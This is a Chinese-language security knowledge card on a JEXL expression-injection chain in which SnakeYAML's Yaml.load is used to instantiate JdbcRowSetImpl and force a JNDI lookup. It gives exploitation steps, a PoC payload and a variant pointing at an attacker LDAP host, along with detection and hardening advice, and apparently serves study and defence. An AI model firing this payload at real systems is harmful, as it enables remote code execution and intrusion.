---
id: web-java-expression-jexl-snakeyaml-load-gadget
title: JEXL new() 调 SnakeYAML.load 组件 gadget：!!JdbcRowSetImpl 属性注入触发 JNDI lookup
type: scenario
domain: web
path: web/java/expression
technique: jexl-new-snakeyaml-load-jdbcrowsetimpl-jndi-gadget
aliases:
- JEXL SnakeYAML
- Yaml.load gadget
- JdbcRowSetImpl YAML
- snakeyaml JNDI
- YAML 全局 tag 注入
tags:
- java
- jexl
- expression-injection
- snakeyaml
- jndi
- gadget
- ldap
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V365
  verified_at: '2026-11-09T04:23:26+08:00'
  notes: 已对照原文核对：Yaml.load 全局 tag 实例化 JdbcRowSetImpl、dataSourceName+autoCommit 触发链正确（本地 JDK 8 字节码确认 setAutoCommit(conn==null)→connect()→InitialContext.lookup(dataSourceName)，键顺序要求合理）；SnakeYAML 1.25 依赖表述与原文一致；版本表述 3.3+ JexlPermissions / 3.2 及更早 JexlSandbox 正确。未启动 LDAP 服务端到端验证 JNDI 回连及 JDK trustURLCodebase 限制。
---

## 一句话结论

目标 classpath 存在使用不安全默认 Constructor 的 SnakeYAML 时，JEXL 表达式 `new('org.yaml.snakeyaml.Yaml').load('!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: ldap://attacker/aa, autoCommit: true}')` 会让 `Yaml.load` 按 YAML 全局 tag 实例化 `JdbcRowSetImpl` 并注入属性，`autoCommit` 触发 JNDI lookup，落到 LDAP/JNDI 利用链。

## 原理

- JEXL（Apache Commons JEXL）表达式注入入口下，`new('类名', 参数...)` 可实例化任意类并调用其实例方法；`Yaml.load(String)` 正是实例方法，因此可直接 `new('org.yaml.snakeyaml.Yaml').load(yamlText)`。
- SnakeYAML 默认 Constructor 支持全局 tag `!!类名`：加载文档时会实例化该全限定类名的对象，并把 YAML 映射的键值作为 JavaBean 属性写入。
- `com.sun.rowset.JdbcRowSetImpl` 的 `dataSourceName` 属性保存 JNDI 地址；设置 `autoCommit=true` 会触发 `connect()`，内部 `InitialContext().lookup(dataSourceName)` 发起 JNDI 访问。攻击者 LDAP 服务可返回恶意序列化对象或引用；能否远程加载字节码受 JDK 版本与 trustURLCodebase 限制，必要时配合本地工厂或返回序列化数据。
- YAML 映射保持键顺序：`dataSourceName` 写在 `autoCommit` 之前，确保 lookup 发生时地址已就位。
- 边界：JEXL 3.3+ 的 `JexlPermissions`（3.2 及更早为 `JexlSandbox`）需允许 `org.yaml.snakeyaml.*` 与 `new`；目标需有 SnakeYAML 依赖（原文演示 1.25）、JDK 提供 `JdbcRowSetImpl`（如 JDK 8）、且可访问攻击者 JNDI/LDAP 服务。若目标改用 `SafeConstructor`/`LoaderOptions` 限制全局 tag，此链失效。

## 触发条件

- JEXL 表达式注入入口，引擎允许 `new`，permissions/sandbox 未禁止 `org.yaml.snakeyaml.Yaml`。
- classpath 存在不安全默认 Constructor 的 SnakeYAML（原文演示 snakeyaml 1.25）。
- JDK 提供 `com.sun.rowset.JdbcRowSetImpl`；目标可出网访问攻击者 JNDI/LDAP 服务，或存在可用本地 JNDI 工厂链。
- 触发效果需可观察（LDAP 访问日志、命令副作用等）。

## 利用步骤

1. 确认目标 classpath 有 SnakeYAML（依赖清单、报错信息、已知功能点）。
2. 启动 LDAP/RMI 服务返回恶意对象（或准备本地工厂链）。
3. 提交 `Yaml.load` 表达式，YAML 中 `dataSourceName` 在前、`autoCommit` 在后。
4. 通过 LDAP 访问日志或命令副作用确认触发。

## PoC

```java
new('org.yaml.snakeyaml.Yaml').load('!!com.sun.rowset.JdbcRowSetImpl {dataSourceName: ldap://127.0.0.1:7777/aa, autoCommit: true}')
```

## 变体与关联

- 其他 YAML gadget 可按目标依赖替换类与属性，本质相同：`Yaml.load` 的全局 tag 实例化加属性注入。
- 若 JEXL 内不允许直接 `new` SnakeYAML，可经其他组件/反序列化入口调用 `Yaml.load`；本卡只覆盖 JEXL 直达路径。
- 同目录另三张拆分卡：命令执行 [[web-java-expression-jexl-new-processbuilder-command-exec]]、文件读写 [[web-java-expression-jexl-file-read-write-scanner-fileoutputstream]]、反序列化触发 [[web-java-expression-jexl-objectinputstream-deserialization]]。
- 版本说明：原文演示依赖为 commons-jexl3 3.2；3.2 及更早使用 `JexlSandbox`，`JexlPermissions` 自 3.3 引入，权限判断写法需按版本区分。

## 检测与防御

- 检测：表达式参数中出现 `org.yaml.snakeyaml.Yaml`、`!!`、`dataSourceName`、`ldap://`/`rmi://`；YAML 解析日志中的外部类名；应用异常的 JNDI/LDAP 外连。
- 防御：禁止对用户输入求值；`JexlPermissions`（3.3+）/`JexlSandbox`（3.2 及更早）禁止 `org.yaml.snakeyaml.*` 与 `new`。
- 加固：不要用不安全默认 Constructor 解析不可信 YAML（使用 `SafeConstructor`/限制 tag）；升级 JDK 并限制 JNDI 远程 codebase；移除无用 SnakeYAML 依赖。
